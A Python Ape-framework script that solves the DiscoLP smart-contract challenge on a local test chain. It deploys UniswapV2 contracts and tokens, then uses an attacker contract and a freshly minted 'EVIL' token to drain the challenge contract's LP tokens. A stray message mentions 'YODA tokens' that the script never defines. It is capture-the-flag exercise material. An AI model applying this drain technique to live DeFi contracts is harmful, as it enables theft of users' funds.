from ape import accounts, project
from .utils.helper import w3, get_timestamp, MAX_UINT256

INITIAL_LP_LIQUIDITY = w3.to_wei(100000, "ether")
INITIAL_ATTACKER_TOKEN_BALANCE = w3.to_wei(1, "ether")


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # get accounts
    deployer = accounts.test_accounts[0]
    attacker = accounts.test_accounts[1]

    # deploy uniswap v2 contracts
    print("\n--- Deploying UniswapV2 contracts ---\n")
    factory = project.UniswapV2Factory.deploy(
        deployer.address,
        sender=deployer,
    )
    weth = project.WETH9.deploy(sender=deployer)
    router = project.UniswapV2Router02.deploy(
        factory.address,
        weth.address,
        sender=deployer,
    )
    # deploy token contracts
    print("\n--- Deploying Token Contracts ---\n")
    jimbo = project.Token.deploy(
        "JIMBO",
        deployer.address,
        INITIAL_LP_LIQUIDITY + INITIAL_ATTACKER_TOKEN_BALANCE,
        sender=deployer,
    )
    jambo = project.Token.deploy(
        "JAMBO",
        deployer.address,
        INITIAL_LP_LIQUIDITY + INITIAL_ATTACKER_TOKEN_BALANCE,
        sender=deployer,
    )

    # sending attacker 1 of each token
    jimbo.transfer(
        attacker.address,
        INITIAL_ATTACKER_TOKEN_BALANCE,
        sender=deployer,
    )
    jambo.transfer(
        attacker.address,
        INITIAL_ATTACKER_TOKEN_BALANCE,
        sender=deployer,
    )

    # print create pair
    print("\n--- Creating pair ---\n")
    pair_address = factory.createPair(
        jimbo.address,
        jambo.address,
        sender=deployer,
    ).return_value

    # deploy challenge contract
    print("\n--- Deploying Challenge Contract ---\n")
    challenge = project.DiscoLP.deploy(
        "DiscoLP",
        "DISCO",
        18,
        pair_address,
        sender=deployer,
    )
    # approve router for tokens
    jimbo.approve(router.address, MAX_UINT256, sender=deployer)
    jambo.approve(router.address, MAX_UINT256, sender=deployer)

    # adding liquidity to pair
    router.addLiquidity(
        jimbo.address,
        jambo.address,
        INITIAL_LP_LIQUIDITY,
        INITIAL_LP_LIQUIDITY,
        1,
        1,
        challenge.address,
        get_timestamp() * 2,
        sender=deployer,
    )

    # define initial balances for attacker and challenge
    attacker_initial_bal = challenge.balanceOf(attacker.address) / 10**18
    challenge_initial_bal = challenge.balanceOf(challenge.address) / 10**18

    print(
        f"\n--- \nInitial Balances:\n⇒ Attacker: {attacker_initial_bal}\n⇒ Challenge: {challenge_initial_bal}\n---\n"
    )

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    attacker_contract = project.DiscoLPAttacker.deploy(
        challenge.address,
        router.address,
        jimbo.address,
        sender=attacker,
    )
    jimbo.transfer(
        attacker_contract.address,
        INITIAL_ATTACKER_TOKEN_BALANCE,
        sender=attacker,
    )
    evil = project.Token.deploy(
        "EVIL",
        attacker_contract.address,
        INITIAL_LP_LIQUIDITY * 2,
        sender=attacker,
    )
    attacker_contract.attack(evil.address, sender=attacker)

    # --- AFTER EXPLOIT --- #
    print("\n--- After exploit: Stole all YODA tokens from Challenge contract ---\n")

    # define ending balances for attacker and challenge
    attacker_final_bal = challenge.balanceOf(attacker.address) / 10**18
    challenge_final_bal = challenge.balanceOf(challenge.address) / 10**18

    print(
        f"\n--- \nFinal Balances:\n⇒ Attacker: {attacker_final_bal}\n⇒ Challenge: {challenge_final_bal}\n---\n"
    )

    assert challenge.balanceOf(attacker.address) > w3.to_wei(100, "ether")

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
